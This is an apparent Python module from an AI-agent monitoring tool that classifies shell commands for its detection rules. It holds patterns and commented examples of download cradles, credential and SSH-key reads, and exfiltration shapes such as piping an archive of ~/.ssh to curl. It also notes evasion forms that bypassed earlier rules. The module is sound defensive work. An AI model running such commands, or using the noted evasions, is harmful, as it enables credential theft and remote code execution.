"""Command classification shared by the sequence rules and the hook client.

The default privacy configuration hashes tool arguments inside the hook process
and never stores command text, which left every command-regex rule blind on real
captured traffic: the demo and the tests injected `command`, production events
did not have one. The fix is to classify the command *where the plaintext is
still visible* — in the hook, before hashing — and ship only category labels
(`tool.traits`). No command text leaves the machine; the rules match the labels
when the text is absent.

This module is imported by scripts/agentmetry_ingest.py via the same sys.path
mechanism as the DLP scanner, so it must stay dependency-free: `re` only, no
core.config, no pydantic.

Rule docstrings explaining each pattern's provenance stay in rules.py; this
module owns the regexes so the hook and the rules cannot drift apart.
"""

from __future__ import annotations

import base64
import binascii
import re
from typing import NamedTuple

# A raw-IP URL and a download/execute verb in the same command is a classic
# malware download cradle. Legit tooling uses domains and package managers.
RAW_IP_URL = re.compile(r"https?://((?:\d{1,3}\.){3}\d{1,3})")
# Loopback is not ingress — fetching your own orchestrator's health endpoint
# must not read as a download cradle (see rules.py for the war story).
LOOPBACK_IP = re.compile(r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0)$")
# Every URL host in a command, so a pipe-to-interpreter can be judged by where it
# actually points rather than by shape alone.
URL_HOST = re.compile(r"https?://(\[[0-9a-f:]+\]|[^/\s:'\"]+)", re.IGNORECASE)
# The same machine, spelled the several ways people spell it. `0.0.0.0` is here
# because curling your own bound service by that address is common, even though
# it means "all interfaces" when binding rather than when connecting.
LOOPBACK_HOST = re.compile(
    r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0|localhost|\[::1\]|\[::ffff:127(?:\.\d{1,3}){3}\])$",
    re.IGNORECASE,
)
DOWNLOAD_EXEC = re.compile(
    r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
    r"certutil|bitsadmin|invoke-expression|\biex\b",
    re.IGNORECASE,
)
ENCODED_CMD = re.compile(r"-enc(odedcommand)?\b|frombase64string", re.IGNORECASE)

# Fetch remote content and feed it straight to an interpreter (ADI §4.2).
# An interpreter given its own program does not execute the pipe; it reads it as
# data. `curl api/x.json | python -c 'json.load(sys.stdin)'` is a data pipeline,
# and calling it a download cradle put a critical on ordinary scripting (issue
# #50). `curl x.sh | python` has no script of its own, so the download *is* the
# program, and that stays a cradle.
#
# Residual, stated rather than hidden: `| python -c "exec(sys.stdin.read())"`
# reaches for the download deliberately and slips this. INLINE_EVAL sees that
# shape, and a cradle written that way is no longer hiding.
_INLINE_SCRIPT = r"(?!\s*-\w*[ce]\b)"

PIPE_TO_SHELL = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
    r"(sudo\s+)?\b(ba|z|k|da)?sh\b" + _INLINE_SCRIPT + r"|"
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
    r"(iex|invoke-expression|python\d?|perl|ruby|node)\b" + _INLINE_SCRIPT,
    re.IGNORECASE,
)

# The same cradle without a pipe. `bash <(curl -s https://host/x.sh)` and
# `source <(curl ...)` fetch and execute in one step and never contain the `|`
# that PIPE_TO_SHELL requires, so they walked past every download-cradle rule.
# Found by auditing the engine for five-minute evasions rather than by a
# detection firing, which is the point: the corpus only ever contained the
# shapes somebody thought to write down.
# `<(` is process substitution and `< <(` redirects from it; both are one `<`
# away from each other and an earlier draft of this pattern required two,
# matching neither of the forms an attacker would actually type.
PROC_SUBST_EXEC = re.compile(
    r"\b(?:sudo\s+)?(?:ba|z|k|da)?sh\b\s*<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b|"
    r"\b(?:source|\.)\s+<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b|"
    r"\b(?:python\d?|perl|ruby|node)\b[^\n|;&]*<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b",
    re.IGNORECASE,
)

# Tools whose whole job is to move bytes off the box. Lives here rather than in
# mitre.py so the mapper and the trait classifier cannot drift, which is the
# lesson of #40.
BARE_IP = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
NETWORK_CLIENT = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod|nc|netcat|scp|rsync|ftp|telnet)\b",
    re.IGNORECASE,
)


def reaches_remote_host(command: str) -> bool:
    """True when the command names a target that is not this machine.

    Loopback is not egress. Hitting your own health endpoint is the single most
    common thing a developer does while running this tool, and counting it would
    bury the one event that matters under a hundred that do not. Anything off
    the box counts, including the LAN: exfil to the machine next to you is
    still exfil.
    """
    hosts = URL_HOST.findall(command or "") + BARE_IP.findall(command or "")
    return any(not LOOPBACK_HOST.match(h) for h in hosts)


# A fetch that writes the response to a named file, from any host. The staged
# half of a two-step cradle, and deliberately host-agnostic: STAGING_HOST is a
# list of seven services, and registering a domain costs a few euros (#43).
#
# Host-agnostic only works because the *rule* additionally requires that the
# file written here is the file executed later. Treating any remote fetch as
# staging would fire on `curl -sO https://api.example.com/schema.json && python
# generate.py`, which is a normal working day.
# Deliberately not one regex. curl's download flags do not share a shape and a
# single pattern got all of these wrong:
#
#   curl -o /tmp/x.sh URL     writes /tmp/x.sh          (flag takes an argument)
#   curl -O URL               writes ./x.sh             (flag takes NONE; name
#                                                        comes from the URL)
#   curl -sO URL              same, combined short flags
#   curl -fsSLo /tmp/y.sh URL same as -o, combined
#   wget URL                  writes ./x.sh             (no flag at all)
#
# The first draft matched `-o|--output|-O|...` followed by a token, which missed
# `-sO` and `-fsSLo` entirely and, for `curl -s -O URL`, captured the string
# "https" as the filename. Case matters too: curl's `-o` and `-O` are different
# flags, so these are the one place in this module that must not be IGNORECASE.
_FETCH_OUTPUT_FLAG = re.compile(r"(?:^|\s)-[a-zA-Z]*o\s+(?P<path>[^\s|;&]+)")
_FETCH_OUTFILE_FLAG = re.compile(r"(?:^|\s)(?:--output|-OutFile)\s+(?P<path>[^\s|;&]+)", re.IGNORECASE)
_FETCH_REMOTE_NAME = re.compile(r"(?:^|\s)-[a-zA-Z]*O(?:\s|$)|--remote-name\b")
_FETCH_URL = re.compile(r"https?://[^\s'\"|;&]+", re.IGNORECASE)
_BARE_WGET = re.compile(r"\bwget\b", re.IGNORECASE)
_CURL_CMD = re.compile(r"\bcurl\b", re.IGNORECASE)
# wget's -O is the output document. Its lowercase -o is a logfile, so it is
# deliberately absent here.
_WGET_OUTPUT_FLAG = re.compile(r"(?:^|\s)(?:-[a-zA-Z]*O|--output-document(?:=|\s+))\s*(?P<path>[^\s|;&]+)")

FETCH_TO_FILE = re.compile(
    r"\b(?:curl|wget|iwr|invoke-webrequest)\b", re.IGNORECASE
)

# Running a named file through an interpreter or shell.
EXECUTE_FILE = re.compile(
    r"\b(?:bash|sh|zsh|dash|source|\.)\s+(?P<path>[\w./~\\-]+\.(?:sh|bash|zsh))\b|"
    r"\b(?:python\d?|perl|ruby|node|deno|bun)\s+(?P<path2>[\w./~\\-]+\.(?:py|pl|rb|js|mjs|ts))\b|"
    r"\bpowershell(?:\.exe)?\s+(?:-\w+\s+)*(?P<path3>[\w./~\\-]+\.ps1)\b|"
    r"\bchmod\s+\+x\s+(?P<path4>[\w./~\\-]+)",
    re.IGNORECASE,
)


def _basename(path: str) -> str:
    return path.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].split("?", 1)[0]


def fetched_files(command: str) -> set[str]:
    """Basenames a command downloads to disk, from any host.

    Handled per tool, because curl and wget give the same two letters opposite
    meanings and treating them alike produces the wrong filename rather than no
    filename, which is the worse failure:

        curl -o FILE URL    writes FILE
        curl -O URL         writes the URL basename (flag takes no argument)
        wget -O FILE URL    writes FILE
        wget -o FILE URL    writes a LOG to FILE; the download still goes to
                            the URL basename
        wget URL            writes the URL basename

    `wget -O /tmp/payload.sh https://host/readme.txt` is the case that made this
    worth splitting: read as curl it yields `readme.txt`, the later
    `bash /tmp/payload.sh` does not match, and the rule goes quiet.
    """
    text = command or ""
    if not FETCH_TO_FILE.search(text):
        return set()

    found: set[str] = set()
    url_names = {_basename(u) for u in _FETCH_URL.findall(text)}
    url_names.discard("")

    uses_wget = _BARE_WGET.search(text) is not None
    uses_curl = _CURL_CMD.search(text) is not None

    if uses_wget:
        explicit = [
            _basename(m.group("path")) for m in _WGET_OUTPUT_FLAG.finditer(text)
        ]
        explicit = [n for n in explicit if n and not n.startswith("-")]
        found.update(explicit or url_names)

    if uses_curl:
        explicit = [
            _basename(m.group("path")) for m in _FETCH_OUTPUT_FLAG.finditer(text)
        ]
        explicit = [n for n in explicit if n and not n.startswith("-")]
        found.update(explicit)
        if _FETCH_REMOTE_NAME.search(text):
            found.update(url_names)

    for m in _FETCH_OUTFILE_FLAG.finditer(text):  # PowerShell -OutFile
        name = _basename(m.group("path"))
        if name and not name.startswith("-"):
            found.add(name)

    return found


def executed_files(command: str) -> set[str]:
    """Basenames a command runs."""
    found: set[str] = set()
    for m in EXECUTE_FILE.finditer(command or ""):
        for group in ("path", "path2", "path3", "path4"):
            value = m.group(group)
            if value:
                found.add(value.rsplit("/", 1)[-1].rsplit("\\", 1)[-1])
    return found


# Suffixes a later `bash file` / `./file` is executing, not mentioning.
# `chmod +x` is deliberately absent: making a file executable is not running it.
_SCRIPT_SUFFIXES = (
    ".sh", ".bash", ".zsh", ".ksh", ".ps1", ".psm1", ".py", ".pyw",
    ".pl", ".rb", ".js", ".mjs", ".cjs", ".php", ".command",
)


def _script_token(token: str) -> str | None:
    token = token.strip("'\"")
    if not token or token.startswith("-") or token.startswith("("):
        return None
    base = _basename(token)
    low = base.lower()
    if any(low.endswith(suffix) for suffix in _SCRIPT_SUFFIXES):
        return base
    return None


def executed_script_names(command: str) -> set[str]:
    """Basenames a command actually runs, including `./script.sh`.

    `executed_files` requires an interpreter word (`bash file.sh`). Agents also
    run `./file.sh` with no interpreter word, and a write-then-exec rule that
    missed that form would miss the way a shell script is usually started.
    `chmod +x` is not included: the execution is the later invocation.
    """
    text = command or ""
    found: set[str] = set()
    for m in EXECUTE_FILE.finditer(text):
        for group in ("path", "path2", "path3"):
            value = m.group(group)
            if value:
                found.add(_basename(value.strip("'\"")))
    for segment in re.split(r"[|;&\n]", text):
        parts = segment.split()
        if not parts:
            continue
        base = _script_token(parts[0])
        if base:
            found.add(base)
    return found


_SCRIPT_NAME = re.compile(r"^[A-Za-z0-9._-]{1,255}$")


def clean_script_names(names: list[str] | set[str]) -> list[str]:
    """Basenames safe to store on an event. Content never is.

    A slash would mean a path survived the basename split. A space or newline
    would mean a body did. Eight names is enough for one tool call.
    """
    out: list[str] = []
    seen: set[str] = set()
    for raw in names:
        base = str(raw).replace("\\", "/").rstrip("/").rsplit("/", 1)[-1].strip()
        if not base or base in (".", "..") or not _SCRIPT_NAME.match(base):
            continue
        if base in seen:
            continue
        seen.add(base)
        out.append(base)
        if len(out) >= 8:
            break
    return out


# An interpreter that speaks HTTP is a network client, whatever it is called.
# `_NETWORK_CLIENT` in mitre.py listed curl, wget, nc, scp and friends, so
# `python -c "urllib.request.urlopen(...)"` carrying a file out was tagged
# generic Execution and `credential-exfil` could not fire on it. That is the
# modal exfil channel in a cloud or CI environment, where curl may not even be
# installed but a Python runtime always is.
INTERPRETER_NETWORK = re.compile(
    r"\b(?:python\d?|node|deno|bun|ruby|perl|php)\b[^\n]*?"
    r"(?:urlopen|urllib|requests\.(?:get|post|put|patch|request)|httpx|"
    r"http\.client|aiohttp|socket\.(?:socket|create_connection)|"
    r"net/http|open-uri|Net::HTTP|LWP::|"
    r"fetch\s*\(|axios|XMLHttpRequest|file_get_contents|curl_exec)",
    re.IGNORECASE,
)

# An inline script body is code, not prose, and on Unix it is idiomatically
# written in *single* quotes -- precisely so the shell does not expand what is
# inside it.
#
# INTERPRETER_NETWORK was matched against `literal`, which blanks single quotes,
# so the idiomatic spelling of the very thing it was added to catch stayed
# invisible: `python -c 'urlopen(...)'` and `node -e 'fetch(...)'` earned no
# net_egress, while the double-quoted spelling fired. The corpus pinned only the
# double-quoted form, so nothing noticed. Choosing `literal` was a deliberate
# trade against `echo 'python -c "urlopen"'`, but it bought that false positive
# with a false negative on the more common form, which is the worse half for a
# recorder.
#
# The flag itself must be unmasked, which keeps the false positive the original
# choice was protecting against: in `echo 'python -c "urlopen(...)"' >> notes.md`
# the `-c` sits inside quotes, so this does not match and the body stays masked.
# The same rule as everywhere else here -- the verb must be unmasked, the
# arguments may be quoted -- extended to the flag that turns an argument into a
# program.
INLINE_EVAL = re.compile(
    r"\b(?:python\d?|node|deno|bun|ruby|perl|php)\b\s+(?:-[\w-]+\s+)*"
    r"(?:-(?:c|e|E|r)\b|--eval\b|--execute\b)|"
    r"\b(?:deno|bun)\s+eval\b",
    re.IGNORECASE,
)


def interpreter_network_text(spoken: str, literal: str, written: str) -> str:
    """The view INTERPRETER_NETWORK should read for this command.

    Shared by the trait classifier and the MITRE mapper so the two cannot answer
    the same question differently, which is the lesson of #40.
    """
    return spoken if INLINE_EVAL.search(written) else literal

# `bash: rm -rf build/` is a deletion even though the tool is named "Bash".
DELETE_COMMAND = re.compile(
    r"\brm\s+(-[a-z]*\s+)*|\brmdir\b|\bunlink\b|remove-item\b|\bdel\s+/", re.IGNORECASE
)

# Content an outsider can author (gh issues/PRs, git fetch) — ADI provenance.
UNTRUSTED_INPUT_COMMAND = re.compile(
    r"\bgh\s+(issue|pr)\s+(view|list|diff|comment)|"
    r"\bgit\s+(fetch|pull|clone)\b",
    re.IGNORECASE,
)

# PR review provenance (ADI §4.3): description vs code vs merge.
PR_DESC_COMMAND = re.compile(r"\bgh\s+pr\s+view\b", re.IGNORECASE)
PR_COMMIT_COMMAND = re.compile(
    r"\bgh\s+pr\s+(diff|checkout|files)\b|\bgit\s+show\b", re.IGNORECASE
)
PR_MERGE_COMMAND = re.compile(r"\bgh\s+pr\s+merge\b|\bgit\s+merge\b", re.IGNORECASE)

# Cloud and cluster APIs used after credential harvest (HF July 2026 lateral phase).
CLOUD_API = re.compile(
    r"\bkubectl\b|"
    r"(?:^|\s)aws\s+\w|"
    r"\bgcloud\b|"
    r"\baz\s+(?:account|login|keyvault|aks|storage)\b|"
    r"\b(?:hf|huggingface-cli)\b|"
    r"\baliyun\b|\btencentcloud\b|\bbce\b|\bossutil\b|\bcoscmd\b",
    re.IGNORECASE,
)

# Push harvested material to a remote the operator did not intend (Nx s1ngularity).
GIT_EXFIL = re.compile(
    r"\bgit\s+push\b|"
    r"\bgh\s+repo\s+(?:create|sync)\b|"
    r"\bgh\s+release\s+upload\b",
    re.IGNORECASE,
)

# Public staging hosts used for agent C2 (gist, HF raw files, GitHub raw content).
STAGING_HOST = re.compile(
    r"https?://(?:[\w-]+\.)?(?:"
    r"githubusercontent\.com|gist\.github\.com|raw\.github\.com|"
    r"huggingface\.co|pastebin\.com|gitlab\.com|bitbucket\.org"
    r")",
    re.IGNORECASE,
)
STAGING_FETCH = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b",
    re.IGNORECASE,
)
# Second-step execution after a staged download — excludes package managers.
RISKY_EXEC_AFTER_STAGING = re.compile(
    r"\b(bash|sh|zsh|dash)\s+[\w./~-]+\.(?:sh|bash)\b|"
    r"\bpython\d?\s+[\w./~-]+\.py\b|"
    r"\bpython\d?\s+-c\b|"
    r"\b(iex|invoke-expression|eval)\b|"
    r"\bpowershell(?:\.exe)?\s+-(?:enc|f|file)\b",
    re.IGNORECASE,
)
#: A fetch that leaves something behind: written to disk, or handed onward. A
#: fetch that only printed staged nothing, so there is no artifact for a later
#: command to run (issue #51).
STAGES_ARTIFACT = re.compile(
    r"\s-[a-zA-Z]*[oO]|"          # curl -o / -O, wget -O
    r"\s--output(?:-document)?|"
    r"\s>\s*\S|"                     # shell redirect to a file
    r"\s-[a-zA-Z]*P|"             # wget -P <dir>
    r"[|]",                          # piped onward, including into an interpreter
    re.IGNORECASE,
)

BENIGN_AFTER_STAGING = re.compile(
    r"\b(npm|yarn|pnpm|pip|pip3|cargo|go)\s+(?:install|run|build)\b",
    re.IGNORECASE,
)

# ----------------------------------------------------------------------
# Credential access
#
# This used to live only in mitre.py, as a tuple of substrings matched with
# `p in text`. Two consequences, both real:
#
# 1. `.env` matched anything containing those four characters, so the module
#    path `agentmetry.core.diagnostics.env_file` was tagged T1552.001 and
#    manufactured the credential half of two critical findings (#40).
# 2. It only ever described *paths*, so `echo $AWS_SECRET_ACCESS_KEY` was
#    generic Execution. Reading a secret out of the environment is how
#    credentials are held in every container and CI runner built this decade.
#
# It lives here now because the trait classifier and the MITRE mapper were two
# classifiers making the same judgement from different data, and the sequence
# rules trusted the one with less information. One source, one answer.
# ----------------------------------------------------------------------

# Distinctive enough that seeing them at all is worth a tag. `.aws/credentials`
# and `.docker/config.json` do not turn up in a sentence by accident.
CREDENTIAL_PATH = re.compile(
    r"\.aws[/\\]credentials\b|"
    r"\.netrc\b|\.npmrc\b|"
    r"\.kube[/\\]config\b|"
    r"\bcredentials\.json\b|\bservice-account\b|"
    r"\bsecrets\.ya?ml\b|"
    r"\.docker[/\\]config\.json\b|"
    r"\.config[/\\]gcloud\b",
    re.IGNORECASE,
)

# `.env` needs its own rule because it is four characters long and reads like
# prose. Anchoring it as a filename was not enough: `git commit -m "docs:
# explain .env handling"` still matched, and a commit message is the single
# most likely place for a developer to type it.
#
# So it must look like a *path* (`~/.env`, `./.env`, `config/.env.local`) or sit
# directly after something that reads a file. A bare mention in prose does not
# qualify, which costs nothing: nobody reads a credential file without naming a
# path or a verb.
# `.env.example` is not a credential file. It is the file you commit *instead*
# of one, and reading it is what every developer does on their first day in a
# repository. It was six of seventeen week-one dogfood findings, every one a
# critical, which is the exact rate at which people stop reading criticals
# (issue #44).
#
# The lookahead sits immediately after `\.env` rather than at the end, because
# at the end it fails and the engine simply matches the shorter `.env` prefix,
# leaving the placeholder tagged anyway.
#
# Placeholders only. `.env.local`, `.env.production` and a bare `.env` still
# match, because those hold real values.
_ENV_PLACEHOLDER = r"(?!\.(?:example|sample|template|dist|defaults|placeholder)\b)"

ENV_FILE = re.compile(
    r"[\w.~$-]*[/\\]\.env" + _ENV_PLACEHOLDER + r"(?:\.[A-Za-z0-9_-]+)?\b|"
    r"\b(?:cat|bat|less|more|head|tail|type|source|export|dotenv|load_dotenv|"
    r"get-content|gc|cp|mv|scp|rsync|base64|xxd|od|strings|"
    r"grep|rg|ag|awk|sed|nano|vim|vi|emacs|code|open|start)"
    r"\s+(?:-[-\w]+\s+)*\.env" + _ENV_PLACEHOLDER + r"(?:\.[A-Za-z0-9_-]+)?\b|"
    r"^\s*\.env" + _ENV_PLACEHOLDER + r"(?:\.[A-Za-z0-9_-]+)?\b",
    re.IGNORECASE | re.MULTILINE,
)

# `.ssh[/\\]` required a separator *after* the directory name, so a named key
# matched and the directory holding every key did not: `cp -r ~/.ssh /tmp/k`
# and `tar czf - ~/.ssh | curl -T - https://...` both produced no traits at all.
# Taking the whole directory is the natural way to take every key at once, so
# the shape that mattered most was the one being missed.
#
# Anchored the same way ENV_FILE is, and for the same reason: a bare `.ssh` is
# short enough to appear in prose, and `git commit -m "docs: explain .ssh
# setup"` must not read as a credential access. It has to look like a path, or
# follow something that copies or reads one.
PRIVATE_KEY_PATH = re.compile(
    r"\bid_(?:rsa|ed25519|dsa|ecdsa)\b|"
    r"\.pem\b|"
    r"-----BEGIN\b|"
    r"[\w.~$-]*[/\\]\.ssh\b|"
    r"\b(?:cd|cp|mv|tar|zip|gzip|rsync|scp|ls|cat|chmod|find)"
    r"\s+(?:-[-\w]+\s+)*\.ssh\b",
    re.IGNORECASE,
)

_CREDENTIAL_ENV_NAME = (
    r"(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_SESSION_TOKEN|"
    r"GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|NPM_TOKEN|PYPI_TOKEN|TWINE_PASSWORD|"
    r"OPENAI_API_KEY|ANTHROPIC_API_KEY|HF_TOKEN|HUGGING_FACE_HUB_TOKEN|"
    r"DOCKER_PASSWORD|KUBE_TOKEN|"
    r"[A-Z][A-Z0-9]*_(?:API_KEY|SECRET|SECRET_KEY|ACCESS_KEY|TOKEN|PASSWORD|PASSWD))"
)

# A *live* reference, not a mention. `$AWS_SECRET_ACCESS_KEY` expands even
# inside double quotes, which is why this is matched against the raw command
# while path patterns are not: writing the bare name into documentation is not
# credential access, and dereferencing it is.
CREDENTIAL_ENV = re.compile(
    rf"\$\{{?{_CREDENTIAL_ENV_NAME}|"
    rf"%{_CREDENTIAL_ENV_NAME}%|"
    rf"\$env:{_CREDENTIAL_ENV_NAME}|"
    rf"\bprintenv\b[^\n|;&]*\b{_CREDENTIAL_ENV_NAME}|"
    rf"\bgetenv\(\s*['\"]{_CREDENTIAL_ENV_NAME}|"
    rf"\benviron(?:\[|\.get\(\s*)['\"]{_CREDENTIAL_ENV_NAME}",
    re.IGNORECASE,
)

# Dumping the whole environment reads every secret in it without naming one.
CREDENTIAL_ENV_DUMP = re.compile(
    r"\bprintenv\b\s*(?:$|[|>;&])|"
    r"\benv\b\s*[|>]|"
    r"\bget-childitem\s+env:|\bgci\s+env:|\bls\s+env:",
    re.IGNORECASE,
)

# Secrets held by a service rather than by this machine. Everything above
# describes a credential at rest in a file or an environment variable, which is
# only half of where credentials live: every provider also hands them out
# through an API, and `aws secretsmanager get-secret-value` reads a production
# secret without naming a path or dereferencing a variable. Commands of this
# shape earned `cloud_api` and generic Execution, so a secret fetched this way
# and then sent off the box produced no credential half and no finding -- the
# same gap #40 left for environment variables, one layer out.
#
# Read verbs only, and narrowly. `gh secret set` writes a value and is how CI
# gets configured; tagging it would fire on routine setup. The kubectl form
# requires an output format because `kubectl get secrets` lists names, while
# `-o yaml` prints the base64 values, and a platform engineer listing secret
# names all day is exactly the reader a noisy rule loses.
CREDENTIAL_CLI = re.compile(
    r"\baws\s+secretsmanager\s+get-secret-value\b|"
    r"\baws\s+ssm\s+get-parameters?\b[^\n|;&]*--with-decryption\b|"
    r"\bgh\s+secret\s+(?:list|view|get)\b|"
    r"\bgh\s+auth\s+token\b|"
    r"\baz\s+keyvault\s+secret\s+(?:show|download|list)\b|"
    r"\bgcloud\s+secrets\s+versions\s+access\b|"
    r"\bvault\s+(?:read\b|kv\s+get\b)|"
    r"\bkubectl\s+get\s+secrets?\b[^\n|;&]*-o\s*(?:yaml|json)\b|"
    r"\bdocker\s+secret\s+inspect\b",
    re.IGNORECASE,
)

# Stable vocabulary. Renaming a trait is a breaking change for stored events:
# rules match these strings on events that may be replayed months later.
KNOWN_TRAITS = frozenset({
    "raw_ip_fetch",
    "encoded_cmd",
    "pipe_to_shell",
    "pipe_to_shell_local",
    "cloud_api",
    "git_exfil",
    "staging_fetch",
    "risky_exec",
    "delete_cmd",
    "untrusted_input",
    "pr_desc",
    "pr_commit",
    "pr_merge",
    "credential_access",
    "private_key",
    "net_egress",
    "fetch_to_file",
    "decode_pipe",
})


# A heredoc opener: `<<EOF`, `<<-EOF`, `<< 'PY'`, `<<"SQL"`.
_HEREDOC_OPEN = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")

# Interpreters whose stdin is the program when no script file and no -c/-e
# is given. Shells execute a heredoc (`bash <<EOF`). python/node do too when
# the program is `-` or absent (`python - <<PY`, `python <<PY`), and do not
# when a filename or -c/-e already supplied the program: that heredoc is data.
_SHELLS = frozenset({
    "bash", "sh", "zsh", "dash", "ksh", "ash", "pwsh", "powershell",
})
_LANGS = frozenset({"node", "nodejs", "perl", "ruby", "php"})
_WRAPPERS = frozenset({
    "sudo", "doas", "command", "exec", "env", "time", "nohup", "nice",
    "stdbuf", "builtin", "busybox",
})

# Traits worth reading out of a language program (python/node/...). A shell
# heredoc is itself shell, so the ordinary classifier sees it. A python body
# is not, and running every shell rule over it flags comments (`# gh pr merge`)
# as merges. Credential reads and network calls are the part that was bypassed.
_LANG_PROGRAM_TRAITS_FROM_BODY = frozenset({
    "credential_access", "private_key", "net_egress", "decode_pipe",
    "encoded_cmd", "risky_exec",
})

# Same calls INTERPRETER_NETWORK looks for, without requiring the interpreter
# word on the same line. A heredoc body is the program; the `python` word is
# on the line above it. One alternation, no nested quantifiers.
# `fetch(` cannot sit in the same trailing `\b` as `urlopen`: the parenthesis
# is not a word character, so a boundary after it never matches.
_LANG_NET = re.compile(
    r"\b(?:urlopen|urllib|requests\.(?:get|post|put|patch|request)|httpx|"
    r"http\.client|aiohttp|socket\.(?:socket|create_connection)|"
    r"net/http|open-uri|Net::HTTP|LWP::|axios|XMLHttpRequest|"
    r"file_get_contents|curl_exec|invoke-webrequest|invoke-restmethod)\b|"
    r"\bfetch\s*\(|\biwr\b|\bcurl\b|\bwget\b",
    re.IGNORECASE,
)

# Inline blobs only. A longer token is past the classification budget; the
# pipe shape is still flagged, the bytes are not decoded.
_B64_TOKEN = re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{16,8192}={0,2}(?![A-Za-z0-9+/=])")
_HEX_TOKEN = re.compile(r"(?<![0-9A-Fa-f])[0-9A-Fa-f]{16,8192}(?![0-9A-Fa-f])")


class ExecutedHeredoc(NamedTuple):
    kind: str
    interpreter: str
    body: str
    opener: int


def _prog(token: str) -> str:
    base = token.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
    if base.endswith(".exe"):
        base = base[:-4]
    return base


def _is_python(name: str) -> bool:
    if name == "python":
        return True
    if not name.startswith("python"):
        return False
    rest = name[6:]
    return bool(rest) and all(ch.isdigit() or ch == "." for ch in rest)


def _is_lang(name: str) -> bool:
    return _is_python(name) or name in _LANGS


def _command_tokens(segment: str) -> list[str]:
    """Whitespace tokens, quotes peeled off a token that is entirely quoted.

    A redirection (`2>&1`, `>file`) is not a program name and not a script
    file. Splitting on whitespace is linear. A quote that contains a space
    splits, which only matters for deciding whether stdin is the program,
    and `-c` / a filename still show up as their own tokens in the forms
    people actually type.
    """
    out: list[str] = []
    for tok in segment.replace("\t", " ").split(" "):
        if not tok:
            continue
        if len(tok) >= 2 and tok[0] in "'\"" and tok[-1] == tok[0]:
            tok = tok[1:-1]
        if not tok:
            continue
        if tok[0] in "<>" or (tok[0].isdigit() and ">" in tok):
            continue
        out.append(tok)
    return out


def _strip_wrappers(tokens: list[str]) -> list[str]:
    i = 0
    while i < len(tokens):
        prog = _prog(tokens[i])
        if prog not in _WRAPPERS:
            break
        i += 1
        if prog in ("sudo", "doas"):
            while i < len(tokens) and tokens[i].startswith("-"):
                flag = tokens[i]
                i += 1
                if flag in ("-u", "-g", "--user", "--group") and i < len(tokens):
                    i += 1
            while i < len(tokens) and "=" in tokens[i] and not tokens[i].startswith("-"):
                i += 1
        elif prog == "env":
            while i < len(tokens) and (
                tokens[i].startswith("-") or ("=" in tokens[i] and not tokens[i].startswith("-"))
            ):
                i += 1
        elif prog == "nice":
            while i < len(tokens) and tokens[i].startswith("-"):
                flag = tokens[i]
                i += 1
                if flag in ("-n", "--adjustment") and i < len(tokens):
                    i += 1
        elif prog in ("command", "stdbuf"):
            while i < len(tokens) and tokens[i].startswith("-"):
                i += 1
    return tokens[i:]


def _shell_reads_stdin(prog: str, args: list[str]) -> bool:
    """True when this shell invocation executes stdin as its program."""
    saw_s = False
    i = 0
    while i < len(args):
        arg = args[i]
        low = arg.lower()
        if prog in ("pwsh", "powershell"):
            if low in ("-command", "-c", "-file", "-f"):
                nxt = args[i + 1] if i + 1 < len(args) else ""
                return nxt == "-"
            if low.startswith("-command:") or low.startswith("-file:"):
                return low.rsplit(":", 1)[-1] == "-"
            if low.startswith("-enc"):
                return False
            if arg.startswith("-"):
                i += 1
                continue
            return False
        if low in ("-c", "--command", "-n", "--syntax-check", "--noexec"):
            return False
        if arg == "--":
            rest = args[i + 1:]
            if saw_s:
                return True
            return not any(not item.startswith("-") for item in rest)
        if arg.startswith("-"):
            if not arg.startswith("--"):
                cluster = arg[1:]
                if "c" in cluster or "C" in cluster:
                    return False
                if "n" in cluster and "s" not in cluster and "S" not in cluster:
                    return False
                if "s" in cluster or "S" in cluster:
                    saw_s = True
            i += 1
            continue
        if saw_s:
            return True
        return False
    return True


def _lang_reads_stdin(prog: str, args: list[str]) -> bool:
    """True when python/node/perl/ruby/php will execute stdin as the program."""
    i = 0
    while i < len(args):
        arg = args[i]
        low = arg.lower()
        if low in ("-c", "-e", "-E", "-r", "--eval", "--execute", "-command"):
            return False
        if _is_python(prog) and low == "-m":
            return False
        if arg == "-":
            i += 1
            continue
        if arg.startswith("-"):
            if _is_python(prog) and low in ("-W", "-X") and i + 1 < len(args):
                i += 2
                continue
            i += 1
            continue
        return False
    return True


def _heredoc_consumer(segment: str) -> tuple[str, str]:
    """('shell'|'lang', program) when this simple command executes a heredoc."""
    tokens = _strip_wrappers(_command_tokens(segment))
    if not tokens:
        return "", ""
    prog = _prog(tokens[0])
    args = tokens[1:]
    if prog in _SHELLS and _shell_reads_stdin(prog, args):
        return "shell", prog
    if _is_lang(prog) and _lang_reads_stdin(prog, args):
        return "lang", prog
    return "", ""


def _heredoc_span(command: str, match: re.Match[str]) -> tuple[int, int, int]:
    """body_start, body_end, resume. resume is where a skip should continue."""
    delimiter = match.group(2)
    newline = command.find("\n", match.end())
    if newline == -1:
        return match.end(), match.end(), match.end()
    body_start = newline + 1
    body_end = len(command)
    resume = len(command)
    for line_start, line in _iter_lines(command, body_start):
        if line.strip() == delimiter:
            body_end = line_start
            resume = line_start
            break
    return body_start, body_end, resume


def executed_heredocs(command: str) -> list[ExecutedHeredoc]:
    """Heredocs an interpreter will execute, not heredocs that are data.

    `bash <<EOF` runs the body. `cat > file <<EOF` and `git commit -F - <<EOF`
    do not: the body is text being written, which is why it stays masked
    (#41, #44). `python script.py <<EOF` is data passed to the script.
    `python - <<PY` is the program.
    """
